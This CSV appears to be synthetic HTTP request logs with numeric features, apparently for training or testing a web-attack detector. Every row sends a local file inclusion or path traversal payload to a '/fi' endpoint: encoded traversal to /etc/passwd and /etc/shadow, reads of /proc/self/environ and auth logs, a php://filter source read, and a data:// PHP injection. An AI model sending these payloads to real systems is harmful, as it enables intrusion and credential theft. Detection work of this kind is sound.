timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-02T03:39:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.26,13,4,36,0,403,1091
2025-01-02T03:40:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.23,4,1,21,0,403,759
2025-01-02T03:41:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.64,13,6,22,0,500,1181
2025-01-02T03:42:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.94,13,6,22,0,403,914
2025-01-02T03:43:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.22,10,5,19,0,500,1115
2025-01-02T03:44:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.68,3,4,18,0,500,1188
2025-01-02T03:45:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.46,13,6,24,0,500,1111
2025-01-02T03:46:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.9,10,5,19,0,200,790
2025-01-02T03:47:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.76,3,4,18,0,200,884
2025-01-02T03:48:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.31,13,6,22,0,403,1100
2025-01-02T03:49:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.29,15,7,28,0,403,1129
2025-01-02T03:50:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.97,13,6,24,0,200,1192
2025-01-02T03:51:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,3.8,4,1,21,0,200,848
2025-01-02T03:52:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.64,15,7,28,0,200,1189
2025-01-02T03:53:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.63,10,1,27,0,200,855
2025-01-02T03:54:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.23,15,7,28,0,403,797
2025-01-02T03:55:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.1,7,1,28,0,500,724
2025-01-02T03:56:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.24,4,1,21,0,500,763
2025-01-02T03:57:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.0,10,1,27,0,500,928
2025-01-02T03:58:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.0,10,1,27,0,500,1196
2025-01-02T03:59:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.14,13,4,36,0,200,715
2025-01-02T04:00:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.02,15,7,28,0,403,880
2025-01-02T04:01:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.26,9,5,53,0,500,877
2025-01-02T04:02:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.09,13,4,36,0,200,882
2025-01-02T04:03:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.7,10,1,27,0,403,921
2025-01-02T04:04:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.25,13,6,22,0,500,1109
2025-01-02T04:05:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.4,7,1,28,0,200,714
2025-01-02T04:06:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.88,13,4,36,0,403,840
2025-01-02T04:07:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.52,13,4,36,0,500,938
2025-01-02T04:08:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.35,10,1,27,0,500,969
2025-01-02T04:09:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.0,13,4,36,0,403,874
2025-01-02T04:10:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.42,4,1,21,0,200,767
2025-01-02T04:11:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.22,3,4,18,0,403,832
2025-01-02T04:12:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.56,10,1,27,0,500,1078
2025-01-02T04:13:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.46,7,1,28,0,500,711
2025-01-02T04:14:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.54,13,6,22,0,500,831
2025-01-02T04:15:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.39,10,5,19,0,200,748
2025-01-02T04:16:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.05,13,6,24,0,500,1115
2025-01-02T04:17:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.52,4,1,21,0,500,891
2025-01-02T04:18:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.59,4,1,21,0,500,930
2025-01-02T04:19:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.24,10,5,19,0,500,935
2025-01-02T04:20:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.89,15,7,28,0,403,966
2025-01-02T04:21:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.98,13,6,22,0,403,1108
2025-01-02T04:22:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.13,13,6,22,0,500,868
2025-01-02T04:23:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.03,10,1,27,0,403,1052
2025-01-02T04:24:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.27,7,1,28,0,500,824
2025-01-02T04:25:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.51,13,6,22,0,403,1083
2025-01-02T04:26:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.08,15,7,28,0,200,1175
2025-01-02T04:27:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.8,13,6,24,0,403,908
2025-01-02T04:28:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.11,3,4,18,0,500,1069
2025-01-02T04:29:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.52,15,7,28,0,500,701
2025-01-02T04:30:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.15,3,4,18,0,500,832
2025-01-02T04:31:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.18,10,1,27,0,500,1160
2025-01-02T04:32:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.89,13,6,22,0,403,776
2025-01-02T04:33:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.17,13,4,36,0,403,793
2025-01-02T04:34:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.47,13,6,22,0,200,872
2025-01-02T04:35:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.48,10,5,19,0,403,1157
2025-01-02T04:36:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.38,15,7,28,0,403,1139
2025-01-02T04:37:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.17,15,7,28,0,200,937
2025-01-02T04:38:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.92,13,6,24,0,500,1081
2025-01-02T04:39:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.02,7,1,28,0,200,1071
2025-01-02T04:40:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.46,13,4,36,0,403,755
2025-01-02T04:41:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.42,10,5,19,0,500,881
2025-01-02T04:42:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.84,10,1,27,0,500,771
2025-01-02T04:43:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.51,7,1,28,0,500,888
2025-01-02T04:44:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.55,9,5,53,0,403,955
2025-01-02T04:45:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.98,3,4,18,0,500,1140
2025-01-02T04:46:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.98,3,4,18,0,403,922
2025-01-02T04:47:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.78,13,6,24,0,200,829
2025-01-02T04:48:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.55,13,4,36,0,500,1184
2025-01-02T04:49:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,3.91,7,1,28,0,403,1094
2025-01-02T04:50:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.51,13,4,36,0,500,935
2025-01-02T04:51:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.94,10,1,27,0,200,820
2025-01-02T04:52:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.42,10,5,19,0,500,930
2025-01-02T04:53:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.12,13,6,22,0,403,907
2025-01-02T04:54:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.1,9,5,53,0,403,848
2025-01-02T04:55:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.21,13,6,24,0,200,829
2025-01-02T04:56:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.41,13,6,24,0,500,949
2025-01-02T04:57:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.96,7,1,28,0,200,853
2025-01-02T04:58:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.88,7,1,28,0,500,848
2025-01-02T04:59:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.89,13,6,24,0,403,806
2025-01-02T05:00:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.26,4,1,21,0,403,936
2025-01-02T05:01:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.01,10,5,19,0,200,795
2025-01-02T05:02:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.49,13,4,36,0,200,712
2025-01-02T05:03:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.75,10,5,19,0,403,863
2025-01-02T05:04:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.06,4,1,21,0,403,835
2025-01-02T05:05:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.7,13,6,22,0,200,821
2025-01-02T05:06:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.38,7,1,28,0,403,834
2025-01-02T05:07:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,3.81,7,1,28,0,200,1049
2025-01-02T05:08:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.01,4,1,21,0,500,883
2025-01-02T05:09:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.75,9,5,53,0,403,799
2025-01-02T05:10:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.61,13,6,22,0,500,1094
2025-01-02T05:11:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.78,7,1,28,0,500,1003
2025-01-02T05:12:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.27,10,5,19,0,403,807
2025-01-02T05:13:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.5,4,1,21,0,500,1053
2025-01-02T05:14:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.11,9,5,53,0,403,844
2025-01-02T05:15:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.83,13,4,36,0,500,1097
2025-01-02T05:16:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.97,3,4,18,0,500,1054
2025-01-02T05:17:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.76,13,4,36,0,200,721
2025-01-02T05:18:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.69,13,4,36,0,500,875
2025-01-02T05:19:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.48,4,1,21,0,200,868
2025-01-02T05:20:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.32,10,5,19,0,500,1073
2025-01-02T05:21:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.51,10,1,27,0,403,840
2025-01-02T05:22:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.19,13,6,22,0,200,1067
2025-01-02T05:23:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.05,4,1,21,0,500,775
2025-01-02T05:24:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.91,10,5,19,0,500,1110
2025-01-02T05:25:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.45,3,4,18,0,403,1046
2025-01-02T05:26:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.15,13,4,36,0,200,1075
2025-01-02T05:27:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.06,9,5,53,0,500,1161
2025-01-02T05:28:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.62,3,4,18,0,403,1109
2025-01-02T05:29:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.83,9,5,53,0,200,831
2025-01-02T05:30:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.11,15,7,28,0,200,1083
2025-01-02T05:31:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.66,9,5,53,0,403,717
2025-01-02T05:32:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.3,13,6,22,0,500,977
2025-01-02T05:33:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.01,15,7,28,0,500,1011
2025-01-02T05:34:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.73,7,1,28,0,200,921
2025-01-02T05:35:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.03,10,5,19,0,500,737
2025-01-02T05:36:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.61,10,1,27,0,200,943
2025-01-02T05:37:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.01,13,6,22,0,403,965
2025-01-02T05:38:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,3.98,15,7,28,0,200,1072
2025-01-02T05:39:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.5,4,1,21,0,200,1072
2025-01-02T05:40:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.19,7,1,28,0,500,1038
2025-01-02T05:41:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.46,3,4,18,0,200,937
2025-01-02T05:42:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.28,13,4,36,0,403,1094
2025-01-02T05:43:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.89,13,6,24,0,500,1115
2025-01-02T05:44:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.17,9,5,53,0,500,1030
2025-01-02T05:45:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,3.87,15,7,28,0,500,948
2025-01-02T05:46:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.96,9,5,53,0,200,828
2025-01-02T05:47:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.41,4,1,21,0,200,848
2025-01-02T05:48:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.63,13,6,22,0,200,1095
2025-01-02T05:49:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.16,4,1,21,0,403,931
2025-01-02T05:50:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.78,4,1,21,0,200,1042
2025-01-02T05:51:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.88,3,4,18,0,500,777
2025-01-02T05:52:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.7,3,4,18,0,200,822
2025-01-02T05:53:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.93,9,5,53,0,403,738
2025-01-02T05:54:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.69,10,1,27,0,200,731
2025-01-02T05:55:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.29,13,6,24,0,200,1181
2025-01-02T05:56:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.52,13,6,24,0,500,1196
2025-01-02T05:57:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.08,10,1,27,0,200,1104
2025-01-02T05:58:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.46,9,5,53,0,500,925
2025-01-02T05:59:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.51,13,6,24,0,403,868
2025-01-02T06:00:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.44,13,6,24,0,200,767
2025-01-02T06:01:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.04,4,1,21,0,500,1102
2025-01-02T06:02:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.6,7,1,28,0,200,792
2025-01-02T06:03:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.89,13,6,22,0,500,845
2025-01-02T06:04:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.53,13,6,24,0,500,1194
2025-01-02T06:05:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.57,9,5,53,0,403,1039
2025-01-02T06:06:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.18,13,6,22,0,200,965
2025-01-02T06:07:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.37,3,4,18,0,200,935
2025-01-02T06:08:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.29,10,1,27,0,500,830
2025-01-02T06:09:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.82,13,6,24,0,200,1003
2025-01-02T06:10:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.72,4,1,21,0,500,1105
